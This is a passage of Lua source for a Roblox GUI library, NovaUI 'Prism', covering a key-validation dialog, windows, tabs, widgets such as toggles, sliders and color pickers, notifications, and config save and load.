    local statusLbl=Frame_new("TextLabel"); statusLbl.Size=UDim2.new(1,-32,0,18); statusLbl.Position=UDim2.new(0,16,0,132); statusLbl.BackgroundTransparency=1; statusLbl.Text=""; statusLbl.TextColor3=C3(255,80,80); statusLbl.Font=Enum.Font.Gotham; statusLbl.TextSize=12; statusLbl.TextXAlignment=Enum.TextXAlignment.Left; statusLbl.ZIndex=3; statusLbl.Parent=panel
    local btn=Frame_new("TextButton"); btn.Size=UDim2.new(1,-32,0,38); btn.Position=UDim2.new(0,16,0,158); btn.BackgroundColor3=C3(138,43,226); btn.BorderSizePixel=0; btn.Text="Confirm"; btn.TextColor3=_W1; btn.Font=Enum.Font.GothamBold; btn.TextSize=15; btn.ZIndex=3; btn.Parent=panel
    corner(btn,UDim.new(0,8))
    btn.MouseButton1Click:Connect(function()
        local entered=Trim(inp.Text)
        local valid=false
        for _,k in next,keyList do if k==entered then valid=true; break end end
        if not valid and webhookUrl~="" then
            valid=ValidateKeyWebhook(entered,webhookUrl)
        end
        if valid and bindHWID then
            local hwid=GetHWID()
            valid=(cfg.ExpectedHWID==nil or cfg.ExpectedHWID==hwid)
        end
        if valid then
            CacheKey(entered,cacheKeyFor)
            if cfg.SaveKey and writefile then pcall(writefile,"novaui_key.txt",entered) end
            T(bg,{BackgroundTransparency=1},0.3)
            task.delay(0.35,function() SG:Destroy() end)
            if onSuccess then onSuccess() end
        else
            statusLbl.Text="Invalid key or expired. Try again."
            T(panel,{Position=UDim2.new(0.5,-5,0.5,0)},0.04,QUINT,OUT)
            task.delay(0.08,function() T(panel,{Position=UDim2.new(0.5,5,0.5,0)},0.04,QUINT,OUT) end)
            task.delay(0.16,function() T(panel,{Position=XC},0.06,QUINT,OUT) end)
            if onFail then onFail(entered) end
        end
    end)
    return SG
end

-- ══ CREATE WINDOW ════════════════════════════════════════════════════════════
function NovaUI:CreateWindow(cfg)
    cfg=cfg or {}
    local title=cfg.Title or "NovaUI"
    local subtitle=cfg.Subtitle or "v7 Prism"
    local size=cfg.Size or UDim2.new(0,580,0,440)
    local position=cfg.Position or UDim2.new(0.5,-290,0.5,-220)
    local themeName=cfg.Theme or "Dark"
    local tabStyle=cfg.TabStyle or "Left"
    local blurEnabled=cfg.Blur~=false
    local theme=getTheme(themeName)
    _currentTheme=theme
    local SG=New("ScreenGui",{Name="NovaUI_"..title,ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,Parent=PG})
    local blurEffect
    if blurEnabled then pcall(function() local cam=workspace.CurrentCamera; blurEffect=Frame_new("BlurEffect"); blurEffect.Size=0; blurEffect.Parent=cam; T(blurEffect,{Size=12},0.4,QUINT,OUT) end) end
    local Backdrop=rect(UDim2.new(1,0,1,0),YT,_B0,SG,0.45,1)
    local Win=Frame_new("Frame"); Win.Name="NovaWindow"; Win.Size=size; Win.Position=position; Win.BackgroundColor3=theme.Background; Win.BorderSizePixel=0; Win.ZIndex=2; Win.Parent=SG
    corner(Win,UDim.new(0,18))
    local WinStroke=Frame_new("UIStroke"); WinStroke.Color=theme.StrokeStrong; WinStroke.Thickness=1.2; WinStroke.Parent=Win
    TopHL(Win,2)
    SurfaceGrad(Win,2,false)
    ModernGlassEffect(Win,0.08)
    ModernShadow(Win,0.12,14)
    GlowRing(Win,theme.Accent,1)
    local TopBar=Frame_new("Frame"); TopBar.Name="TopBar"; TopBar.Size=UDim2.new(1,0,0,56); TopBar.Position=YT; TopBar.BackgroundColor3=theme.Surface; TopBar.BorderSizePixel=0; TopBar.ZIndex=3; TopBar.Parent=Win
    corner(TopBar,UDim.new(0,18))
    local TopBarFill=rect(UDim2.new(1,0,0,18),UDim2.new(0,0,1,-18),theme.Surface,TopBar,0,3)
    local TBStroke=Frame_new("UIStroke"); TBStroke.Color=theme.StrokeStrong; TBStroke.Thickness=1.2; TBStroke.Parent=TopBar
    local Stripe=rect(UDim2.new(0,4,0,26),UDim2.new(0,16,0,15),theme.Accent,TopBar,0,4); corner(Stripe,UDim.new(1,0))
    local TitleLbl=Frame_new("TextLabel"); TitleLbl.Size=UDim2.new(0,300,0,28); TitleLbl.Position=UDim2.new(0,26,0,12); TitleLbl.BackgroundTransparency=1; TitleLbl.Text=title; TitleLbl.TextColor3=theme.Text; TitleLbl.Font=Enum.Font.GothamBold; TitleLbl.TextSize=16; TitleLbl.TextXAlignment=Enum.TextXAlignment.Left; TitleLbl.ZIndex=4; TitleLbl.Parent=TopBar
    local SubLbl=Frame_new("TextLabel"); SubLbl.Size=UDim2.new(0,300,0,16); SubLbl.Position=UDim2.new(0,26,0,32); SubLbl.BackgroundTransparency=1; SubLbl.Text=subtitle; SubLbl.TextColor3=theme.SubText; SubLbl.Font=Enum.Font.Gotham; SubLbl.TextSize=11; SubLbl.TextXAlignment=Enum.TextXAlignment.Left; SubLbl.ZIndex=4; SubLbl.Parent=TopBar
    local CloseBtn=Frame_new("TextButton"); CloseBtn.Size=UDim2.new(0,32,0,32); CloseBtn.Position=UDim2.new(1,-44,0,12); CloseBtn.BackgroundColor3=Darken(theme.Error,0.15); CloseBtn.BorderSizePixel=0; CloseBtn.Text="×"; CloseBtn.TextColor3=_W1; CloseBtn.Font=Enum.Font.GothamBold; CloseBtn.TextSize=20; CloseBtn.ZIndex=4; CloseBtn.Parent=TopBar
    corner(CloseBtn,UDim.new(0,10))
    local cbStroke=Frame_new("UIStroke"); cbStroke.Color=theme.Error; cbStroke.Thickness=0.8; cbStroke.Transparency=0.6; cbStroke.Parent=CloseBtn
    local MinBtn=Frame_new("TextButton"); MinBtn.Size=UDim2.new(0,32,0,32); MinBtn.Position=UDim2.new(1,-84,0,12); MinBtn.BackgroundColor3=Darken(theme.Warning,0.15); MinBtn.BorderSizePixel=0; MinBtn.Text="−"; MinBtn.TextColor3=_W1; MinBtn.Font=Enum.Font.GothamBold; MinBtn.TextSize=20; MinBtn.ZIndex=4; MinBtn.Parent=TopBar
    corner(MinBtn,UDim.new(0,10))
    local mbStroke=Frame_new("UIStroke"); mbStroke.Color=theme.Warning; mbStroke.Thickness=0.8; mbStroke.Transparency=0.6; mbStroke.Parent=MinBtn
    local minimized=false
    local fullSize=size
    MinBtn.MouseButton1Click:Connect(function()
        minimized=not minimized
        if minimized then fullSize=Win.Size; T(Win,{Size=UDim2.new(0,Win.AbsoluteSize.X,0,52)},0.25,QUINT,OUT)
        else T(Win,{Size=fullSize},0.25,QUINT,OUT) end
    end)
    CloseBtn.MouseButton1Click:Connect(function()
        TSmooth(Win,{BackgroundTransparency=1,Size=UDim2.new(0,Win.AbsoluteSize.X*0.85,0,Win.AbsoluteSize.Y*0.85)},0.28)
        if blurEffect then TSmooth(blurEffect,{Size=0},0.28) end
        task.delay(0.3,function() SG:Destroy() end)
    end)
    MakeDraggable(TopBar,Win)
    local TopTabBar,topTabButtons,topTabBarH=nil,{},0
    if tabStyle=="Top" then
        topTabBarH=40
        TopTabBar=Frame_new("Frame")
        TopTabBar.Name="TopTabBar"
        TopTabBar.Size=UDim2.new(1,0,0,topTabBarH)
        TopTabBar.Position=UDim2.new(0,0,0,52)
        TopTabBar.BackgroundColor3=theme.Surface
        TopTabBar.BorderSizePixel=0; TopTabBar.ZIndex=3; TopTabBar.Parent=Win
        local ttbFill=rect(UDim2.new(1,0,0,8),UDim2.new(0,0,1,-8),theme.Surface,TopTabBar,0,3)
        local ttbStroke=Frame_new("UIStroke"); ttbStroke.Color=theme.Stroke; ttbStroke.Thickness=1; ttbStroke.Parent=TopTabBar
        local ttbList=Frame_new("UIListLayout"); ttbList.FillDirection=HFILL; ttbList.SortOrder=SORT; ttbList.Padding=UDim.new(0,2); ttbList.Parent=TopTabBar
        local ttbPad=Frame_new("UIPadding"); ttbPad.PaddingLeft=UDim.new(0,8); ttbPad.PaddingTop=UDim.new(0,6); ttbPad.PaddingBottom=UDim.new(0,6); ttbPad.Parent=TopTabBar
    end
    local Sidebar=Frame_new("Frame")
    Sidebar.Name="Sidebar"
    if tabStyle=="Top" then
        Sidebar.Size=UDim2.new(0,0,0,0); Sidebar.Visible=false
    else
        Sidebar.Size=UDim2.new(0,160,1,-52)
        Sidebar.Position=UDim2.new(0,0,0,52)
    end
    Sidebar.BackgroundColor3=theme.Surface; Sidebar.BorderSizePixel=0
    Sidebar.ZIndex=3; Sidebar.Parent=Win
    if tabStyle~="Top" then
        local SBFill=rect(UDim2.new(0,16,1,0),UDim2.new(1,-16,0,0),theme.Surface,Sidebar,0,3)
        local SBStroke=Frame_new("UIStroke"); SBStroke.Color=theme.Stroke; SBStroke.Thickness=1; SBStroke.Parent=Sidebar
        local SBList=Frame_new("UIListLayout"); SBList.SortOrder=SORT; SBList.Padding=UDim.new(0,4); SBList.Parent=Sidebar
        local SBPad=Frame_new("UIPadding"); SBPad.PaddingTop=UDim.new(0,10); SBPad.PaddingLeft=UDim.new(0,8); SBPad.PaddingRight=UDim.new(0,8); SBPad.Parent=Sidebar
    end
    local contentX=tabStyle=="Top" and 0 or 160
    local contentW=tabStyle=="Top" and 0 or -160
    local contentY=52+topTabBarH
    local contentH=-(52+topTabBarH)
    local ContentArea=Frame_new("Frame")
    ContentArea.Name="ContentArea"
    ContentArea.Size=UDim2.new(1,contentW,1,contentH)
    ContentArea.Position=UDim2.new(0,contentX,0,contentY)
    ContentArea.BackgroundColor3=theme.Background
    ContentArea.BorderSizePixel=0; ContentArea.ZIndex=2; ContentArea.Parent=Win
    local CACorner=Frame_new("UICorner"); CACorner.CornerRadius=UDim.new(0,16); CACorner.Parent=ContentArea
    local CAFill=rect(UDim2.new(1,0,0,16),UDim2.new(0,0,0,0),theme.Background,ContentArea,0,2)
    local Window={_SG=SG,_Win=Win,_Sidebar=Sidebar,_TopTabBar=TopTabBar,_ContentArea=ContentArea,_theme=theme,_tabStyle=tabStyle,_topTabButtons=topTabButtons,_tabs={},_activeTab=nil,}
    onTheme(function(t)
        theme=t; Window._theme=t
        Win.BackgroundColor3=t.Background
        TopBar.BackgroundColor3=t.Surface; TopBarFill.BackgroundColor3=t.Surface
        Stripe.BackgroundColor3=t.Accent
        TitleLbl.TextColor3=t.Text; SubLbl.TextColor3=t.SubText
        CloseBtn.BackgroundColor3=t.Error; MinBtn.BackgroundColor3=t.Warning
        WinStroke.Color=t.StrokeStrong; TBStroke.Color=t.Stroke
        Sidebar.BackgroundColor3=t.Surface
        ContentArea.BackgroundColor3=t.Background; CAFill.BackgroundColor3=t.Background
        if TopTabBar then TopTabBar.BackgroundColor3=t.Surface end
    end)
    function Window:ShowTab(name)
        for _,tabObj in next,self._tabs do
            if tabObj._name==name then
                tabObj:_select()
                return
            end
        end
    end
    function Window:CreateTab(cfg)
        cfg=cfg or {}
        local name=cfg.Name or ("Tab"..#self._tabs+1)
        local Page=Frame_new("Frame")
        Page.Name=name
        Page.Size=UDim2.new(1,0,1,0)
        Page.BackgroundColor3=theme.Background
        Page.BorderSizePixel=0
        Page.ZIndex=2
        Page.Visible=(#self._tabs==0)
        Page.Parent=self._ContentArea
        local PageList=Frame_new("UIListLayout")
        PageList.SortOrder=SORT
        PageList.Padding=UDim.new(0,8)
        PageList.Parent=Page
        local PagePad=Frame_new("UIPadding")
        PagePad.PaddingTop=UDim.new(0,10)
        PagePad.PaddingLeft=UDim.new(0,10)
        PagePad.PaddingRight=UDim.new(0,10)
        PagePad.Parent=Page
        local _pageZ=Page.ZIndex or 2
        local function zi() return _pageZ+1 end
        local Tab={_name=name,_Page=Page,_Window=self,_theme=theme,_elements={}}
        function Tab:_select()
            for _,t in next,self._Window._tabs do t._Page.Visible=(t._name==self._name) end
            self._Window._activeTab=self
        end
        if self._tabStyle=="Left" then
            local btn=Frame_new("TextButton")
            btn.Name=name
            btn.Size=UDim2.new(1,-16,0,36)
            btn.BackgroundColor3=theme.Elevated
            btn.BorderSizePixel=0
            btn.Text=name
            btn.TextColor3=theme.Text
            btn.Font=Enum.Font.GothamMedium
            btn.TextSize=13
            btn.ZIndex=3
            btn.Parent=self._Sidebar
            corner(btn,UDim.new(0,8))
            btn.MouseButton1Click:Connect(function() Tab:_select() end)
            insert(self._tabs,Tab)
            if #self._tabs==1 then Tab:_select() end
        elseif self._tabStyle=="Top" then
            local btn=Frame_new("TextButton")
            btn.Name=name
            btn.Size=UDim2.new(0,80,1,-12)
            btn.BackgroundColor3=theme.Elevated
            btn.BorderSizePixel=0
            btn.Text=name
            btn.TextColor3=theme.Text
            btn.Font=Enum.Font.GothamMedium
            btn.TextSize=12
            btn.ZIndex=3
            btn.Parent=self._TopTabBar
            corner(btn,UDim.new(0,6))
            btn.MouseButton1Click:Connect(function() Tab:_select() end)
            insert(self._topTabButtons,btn)
            insert(self._tabs,Tab)
            if #self._tabs==1 then Tab:_select() end
        end
        onTheme(function(t) Tab._theme=t; Page.BackgroundColor3=t.Background end)
        local conns={};local nConn=0
        local function track(c) nConn+=1; conns[nConn]=c; return c end
        function Tab:CreateSection(cfg)
            cfg=cfg or {}
            local title=cfg.Name or "Section"
            local card,z=Frame_new("Frame"),zi()
            card.BackgroundColor3=theme.Elevated
            card.Size=UDim2.new(1,0,0,50)
            card.BorderSizePixel=0
            card.ZIndex=z
            card.Parent=Page
            corner(card,UDim.new(0,14))
            local sk=Frame_new("UIStroke")
            sk.Color=theme.StrokeStrong; sk.Thickness=1; sk.Parent=card
            SurfaceGrad(card,z,false)
            ModernGlassEffect(card,0.06)
            TopHL(card,z)
            local lbl=Frame_new("TextLabel")
            lbl.Size=UDim2.new(1,-20,0,24)
            lbl.Position=UDim2.new(0,10,0,12)
            lbl.BackgroundTransparency=1
            lbl.Text=title
            lbl.TextColor3=theme.Text
            lbl.Font=Enum.Font.GothamBold
            lbl.TextSize=14
            lbl.TextXAlignment=Enum.TextXAlignment.Left
            lbl.ZIndex=z+1
            lbl.Parent=card
            local section={_card=card,_Page=Page,_expanded=true}
            function section:Destroy() card:Destroy(); for i=#conns,1,-1 do if conns[i] then conns[i]:Disconnect(); table.remove(conns,i) end end end
            return section
        end
        function Tab:CreateLabel(cfg)
            cfg=cfg or {}
            local text=cfg.Text or "Label"
            local lbl=Frame_new("TextLabel")
            lbl.Size=UDim2.new(1,0,0,24)
            lbl.BackgroundTransparency=1
            lbl.Text=text
            lbl.TextColor3=theme.Text
            lbl.Font=Enum.Font.Gotham
            lbl.TextSize=14
            lbl.TextXAlignment=Enum.TextXAlignment.Left
            lbl.ZIndex=zi()
            lbl.Parent=Page
            return lbl
        end
        function Tab:CreateButton(cfg)
            cfg=cfg or {}
            local text=cfg.Text or "Button"
            local onclick=cfg.Callback or function() end
            local btn=Frame_new("TextButton")
            btn.Size=UDim2.new(1,0,0,42)
            btn.BackgroundColor3=theme.Accent
            btn.BorderSizePixel=0
            btn.Text=text
            btn.TextColor3=_W1
            btn.Font=Enum.Font.GothamBold
            btn.TextSize=14
            btn.ZIndex=zi()
            btn.Parent=Page
            corner(btn,UDim.new(0,10))
            local bsk=Frame_new("UIStroke")
            bsk.Color=Lighten(theme.Accent,0.3); bsk.Thickness=0.8
            bsk.Transparency=0.5; bsk.Parent=btn
            ModernGlassEffect(btn,0.08)
            track(btn.MouseButton1Click:Connect(function() Ripple(btn,btn.AbsoluteSize.X/2,btn.AbsoluteSize.Y/2,_W1); onclick() end))
            PressAnim(btn,UDim2.new(0.98,0,0.98,0))
            return btn
        end
        function Tab:CreateToggle(cfg)
            cfg=cfg or {}
            local text=cfg.Name or "Toggle"
            local state=cfg.Default or false
            local callback=cfg.Callback or function() end
            local container=Frame_new("Frame")
            container.Size=UDim2.new(1,0,0,40)
            container.BackgroundTransparency=1
            container.BorderSizePixel=0
            container.ZIndex=zi()
            container.Parent=Page
            local lbl=Frame_new("TextLabel")
            lbl.Size=UDim2.new(1,-50,0,40)
            lbl.Position=UDim2.new(0,0,0,0)
            lbl.BackgroundTransparency=1
            lbl.Text=text
            lbl.TextColor3=theme.Text
            lbl.Font=Enum.Font.Gotham
            lbl.TextSize=14
            lbl.TextXAlignment=Enum.TextXAlignment.Left
            lbl.ZIndex=zi()+1
            lbl.Parent=container
            local toggle=Frame_new("Frame")
            toggle.Size=UDim2.new(0,44,0,24)
            toggle.Position=UDim2.new(1,-50,0,8)
            toggle.BackgroundColor3=state and theme.Success or theme.Disabled
            toggle.BorderSizePixel=0
            toggle.ZIndex=zi()+1
            toggle.Parent=container
            corner(toggle,UDim.new(1,0))
            local circle=Frame_new("Frame")
            circle.Size=UDim2.new(0,20,0,20)
            circle.Position=state and UDim2.new(0,22,0,2) or UDim2.new(0,2,0,2)
            circle.BackgroundColor3=_W1
            circle.BorderSizePixel=0
            circle.ZIndex=zi()+2
            circle.Parent=toggle
            corner(circle,UDim.new(1,0))
            local function toggle_state()
                state=not state
                T(toggle,{BackgroundColor3=state and theme.Success or theme.Disabled},0.2)
                T(circle,{Position=state and UDim2.new(0,22,0,2) or UDim2.new(0,2,0,2)},0.2)
                callback(state)
            end
            track(toggle.MouseButton1Click:Connect(toggle_state))
            return {Toggle=function(v) if v~=state then toggle_state() end end}
        end
        function Tab:CreateSlider(cfg)
            cfg=cfg or {}
            local name=cfg.Name or "Slider"
            local min=cfg.Min or 0
            local max=cfg.Max or 100
            local default=cfg.Default or min
            local callback=cfg.Callback or function() end
            local container=Frame_new("Frame")
            container.Size=UDim2.new(1,0,0,60)
            container.BackgroundTransparency=1
            container.BorderSizePixel=0
            container.ZIndex=zi()
            container.Parent=Page
            local lbl=Frame_new("TextLabel")
            lbl.Size=UDim2.new(0.5,0,0,20)
            lbl.Position=UDim2.new(0,0,0,0)
            lbl.BackgroundTransparency=1
            lbl.Text=name
            lbl.TextColor3=theme.Text
            lbl.Font=Enum.Font.GothamBold
            lbl.TextSize=13
            lbl.TextXAlignment=Enum.TextXAlignment.Left
            lbl.ZIndex=zi()+1
            lbl.Parent=container
            local valLbl=Frame_new("TextLabel")
            valLbl.Size=UDim2.new(0.5,0,0,20)
            valLbl.Position=UDim2.new(0.5,0,0,0)
            valLbl.BackgroundTransparency=1
            valLbl.Text=Round(default,2)
            valLbl.TextColor3=theme.SubText
            valLbl.Font=Enum.Font.Gotham
            valLbl.TextSize=12
            valLbl.TextXAlignment=Enum.TextXAlignment.Right
            valLbl.ZIndex=zi()+1
            valLbl.Parent=container
            local track_bg=Frame_new("Frame")
            track_bg.Size=UDim2.new(1,0,0,4)
            track_bg.Position=UDim2.new(0,0,0,28)
            track_bg.BackgroundColor3=theme.Elevated
            track_bg.BorderSizePixel=0
            track_bg.ZIndex=zi()+1
            track_bg.Parent=container
            corner(track_bg,UDim.new(1,0))
            local track_fill=Frame_new("Frame")
            track_fill.Size=UDim2.new((default-min)/(max-min),0,1,0)
            track_fill.Position=YT
            track_fill.BackgroundColor3=theme.Accent
            track_fill.BorderSizePixel=0
            track_fill.ZIndex=zi()+2
            track_fill.Parent=track_bg
            corner(track_fill,UDim.new(1,0))
            local handle=Frame_new("Frame")
            handle.Size=UDim2.new(0,12,0,12)
            handle.Position=UDim2.new((default-min)/(max-min),0,0.5,-6)
            handle.BackgroundColor3=_W1
            handle.BorderSizePixel=0
            handle.ZIndex=zi()+3
            handle.Parent=container
            corner(handle,UDim.new(1,0))
            local dragging=false
            local function updateVal(x)
                local perc=clamp((x-track_bg.AbsolutePosition.X)/track_bg.AbsoluteSize.X,0,1)
                local val=Round(min+perc*(max-min),2)
                valLbl.Text=val
                T(track_fill,{Size=UDim2.new(perc,0,1,0)},0)
                T(handle,{Position=UDim2.new(perc,0,0.5,-6)},0)
                callback(val)
            end
            track(handle.MouseButton1Down:Connect(function() dragging=true end))
            track(handle.MouseButton1Up:Connect(function() dragging=false end))
            track(UserInputService.InputChanged:Connect(function(inp) if dragging and (inp.UserInputType==MMOVE or inp.UserInputType==TOUCH) then updateVal(inp.Position.X) end end))
            return {Set=function(v) updateVal(track_bg.AbsolutePosition.X+(clamp(v,min,max)-min)/(max-min)*track_bg.AbsoluteSize.X) end}
        end
        function Tab:CreateInput(cfg)
            cfg=cfg or {}
            local placeholder=cfg.Placeholder or "Enter text..."
            local callback=cfg.Callback or function() end
            local container=Frame_new("Frame")
            container.Size=UDim2.new(1,0,0,40)
            container.BackgroundTransparency=1
            container.BorderSizePixel=0
            container.ZIndex=zi()
            container.Parent=Page
            local input=Frame_new("Frame")
            input.Size=UDim2.new(1,0,1,0)
            input.BackgroundColor3=theme.Elevated
            input.BorderSizePixel=0
            input.ZIndex=zi()+1
            input.Parent=container
            corner(input,UDim.new(0,8))
            local isk=Frame_new("UIStroke")
            isk.Color=theme.Stroke; isk.Thickness=1; isk.Parent=input
            local inp=Frame_new("TextBox")
            inp.Size=UDim2.new(1,-16,1,0)
            inp.Position=UDim2.new(0,8,0,0)
            inp.BackgroundTransparency=1
            inp.PlaceholderText=placeholder
            inp.PlaceholderColor3=theme.SubText
            inp.TextColor3=theme.Text
            inp.Font=Enum.Font.Gotham
            inp.TextSize=13
            inp.ClearTextOnFocus=false
            inp.ZIndex=zi()+2
            inp.Parent=input
            track(inp.FocusLost:Connect(function() callback(inp.Text) end))
            return {GetText=function() return inp.Text end,SetText=function(t) inp.Text=t end}
        end
        function Tab:CreateColorPicker(cfg)
            cfg=cfg or {}
            local name=cfg.Name or "Color"
            local default=cfg.Default or _W1
            local callback=cfg.Callback or function() end
            local container=Frame_new("Frame")
            container.Size=UDim2.new(1,0,0,50)
            container.BackgroundTransparency=1
            container.BorderSizePixel=0
            container.ZIndex=zi()
            container.Parent=Page
            local lbl=Frame_new("TextLabel")
            lbl.Size=UDim2.new(1,-50,0,20)
            lbl.Position=UDim2.new(0,0,0,0)
            lbl.BackgroundTransparency=1
            lbl.Text=name
            lbl.TextColor3=theme.Text
            lbl.Font=Enum.Font.GothamBold
            lbl.TextSize=13
            lbl.TextXAlignment=Enum.TextXAlignment.Left
            lbl.ZIndex=zi()+1
            lbl.Parent=container
            local preview=Frame_new("Frame")
            preview.Size=UDim2.new(0,40,0,40)
            preview.Position=UDim2.new(1,-50,0,4)
            preview.BackgroundColor3=default
            preview.BorderSizePixel=0
            preview.ZIndex=zi()+1
            preview.Parent=container
            corner(preview,UDim.new(0,6))
            local psk=Frame_new("UIStroke")
            psk.Color=theme.Stroke; psk.Thickness=1; psk.Parent=preview
            local pickerOpen=false
            track(preview.MouseButton1Click:Connect(function()
                pickerOpen=not pickerOpen
                if pickerOpen then
                    local picker=Frame_new("Frame")
                    picker.Size=UDim2.new(0,200,0,120)
                    picker.Position=UDim2.new(0,0,0,60)
                    picker.BackgroundColor3=theme.Elevated
                    picker.BorderSizePixel=0
                    picker.ZIndex=zi()+10
                    picker.Parent=container
                    corner(picker,UDim.new(0,8))
                    local psk2=Frame_new("UIStroke")
                    psk2.Color=theme.Stroke; psk2.Thickness=1; psk2.Parent=picker
                    local pPad=Frame_new("UIPadding")
                    pPad.PaddingTop=UDim.new(0,8); pPad.PaddingLeft=UDim.new(0,8)
                    pPad.PaddingRight=UDim.new(0,8); pPad.PaddingBottom=UDim.new(0,8); pPad.Parent=picker
                    local pList=Frame_new("UIListLayout")
                    pList.SortOrder=SORT; pList.Padding=UDim.new(0,4); pList.Parent=picker
                    local closePicker=function() picker:Destroy(); pickerOpen=false end
                    for i,c in next,{_W1,_B0,theme.Accent,theme.Success,theme.Warning,theme.Error} do
                        local btn=Frame_new("TextButton")
                        btn.Size=UDim2.new(0,50,0,24)
                        btn.BackgroundColor3=c
                        btn.BorderSizePixel=0
                        btn.Text=""
                        btn.ZIndex=zi()+11
                        btn.Parent=picker
                        corner(btn,UDim.new(0,4))
                        track(btn.MouseButton1Click:Connect(function() preview.BackgroundColor3=c; callback(c); closePicker() end))
                    end
                end
            end))
            return {Set=function(c) preview.BackgroundColor3=c; callback(c) end}
        end
        insert(self._tabs,Tab)
        if #self._tabs==1 then Tab:_select() end
        return Tab
    end
    insert(NovaUI.Windows,Window)
    return Window
end

-- ══ EXTRAS ══════════════════════════════════════════════════════════════════
function NovaUI:Notify(cfg)
    cfg=cfg or {}
    local title=cfg.Title or "Notification"
    local desc=cfg.Description or ""
    local duration=cfg.Duration or 3
    local notifSG=New("ScreenGui",{Name="NovaNotif",ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,Parent=PG})
    local notif=Frame_new("Frame")
    notif.Size=UDim2.new(0,320,0,80)
    notif.Position=UDim2.new(1,-340,1,-100)
    notif.BackgroundColor3=_currentTheme.Elevated
    notif.BorderSizePixel=0
    notif.ZIndex=100
    notif.Parent=notifSG
    corner(notif,UDim.new(0,12))
    local sk=Frame_new("UIStroke")
    sk.Color=_currentTheme.StrokeStrong; sk.Thickness=1; sk.Parent=notif
    local ttl=Frame_new("TextLabel")
    ttl.Size=UDim2.new(1,-16,0,24)
    ttl.Position=UDim2.new(0,8,0,8)
    ttl.BackgroundTransparency=1
    ttl.Text=title
    ttl.TextColor3=_currentTheme.Text
    ttl.Font=Enum.Font.GothamBold
    ttl.TextSize=14
    ttl.TextXAlignment=Enum.TextXAlignment.Left
    ttl.ZIndex=101
    ttl.Parent=notif
    local d=Frame_new("TextLabel")
    d.Size=UDim2.new(1,-16,0,40)
    d.Position=UDim2.new(0,8,0,34)
    d.BackgroundTransparency=1
    d.Text=desc
    d.TextColor3=_currentTheme.SubText
    d.Font=Enum.Font.Gotham
    d.TextSize=12
    d.TextWrapped=true
    d.TextXAlignment=Enum.TextXAlignment.Left
    d.ZIndex=101
    d.Parent=notif
    T(notif,{Position=UDim2.new(1,-340,1,-180)},0.3,QUINT,OUT)
    task.delay(duration,function()
        T(notif,{Position=UDim2.new(1,-340,1,-100)},0.3)
        task.delay(0.35,function() notifSG:Destroy() end)
    end)
end

local function sv(v)
    if typeof(v)=="Color3" then return {_c=true,r=v.R,g=v.G,b=v.B}
    elseif typeof(v)=="Vector3" then return {_v=true,x=v.X,y=v.Y,z=v.Z}
    elseif typeof(v)=="UDim2" then return {_u=true,xs=v.X.Scale,xo=v.X.Offset,ys=v.Y.Scale,yo=v.Y.Offset}
    else return v end
end
local function dv(v)
    if type(v)=="table" then
        if v._c then return Color3.new(v.r,v.g,v.b)
        elseif v._v then return Vector3.new(v.x,v.y,v.z)
        elseif v._u then return UDim2.new(v.xs,v.xo,v.ys,v.yo) end
    end
    return v
end
function NovaUI:ExportConfig()
    local s={}
    for f,val in next,NovaUI.Flags do s[f]=sv(val) end
    local ok,enc=pcall(function() return HTTP:JSONEncode(s) end)
    return ok and enc or nil
end
function NovaUI:ImportConfig(json)
    local ok,dec=pcall(function() return HTTP:JSONDecode(json) end)
    if not ok or typeof(dec)~="table" then return false end
    for f,val in next,dec do NovaUI:SetFlag(f,dv(val)) end
    return true
end

-- ══ AUTO-INIT ══════════════════════════════════════════════════════════════════
LoadFlagsAuto()
task.spawn(function()
    while true do
        task.wait(60)
        SaveFlagsAuto()
    end
end)

-- ══ API EXTENSIONS ══════════════════════════════════════════════════════════════
function NovaUI:EnableAutoFlagSave(enable) _flagAutoSave=enable end
function NovaUI:EnableAutoFlagLoad(enable) _flagAutoLoad=enable end
function NovaUI:SaveFlagsNow() SaveFlagsAuto() end
function NovaUI:LoadFlagsNow() LoadFlagsAuto() end
function NovaUI:GetHWID() return GetHWID() end
function NovaUI:ValidateKeyRemote(key,webhookUrl) return ValidateKeyWebhook(key,webhookUrl) end
function NovaUI:CacheKey(key,duration) CacheKey(key,duration or 3600) end
function NovaUI:CheckScriptIntegrity() return _integrityOk end

NovaUI.Version="7.0"
NovaUI.VersionName="Prism"
NovaUI.Themes=Themes

return NovaUI
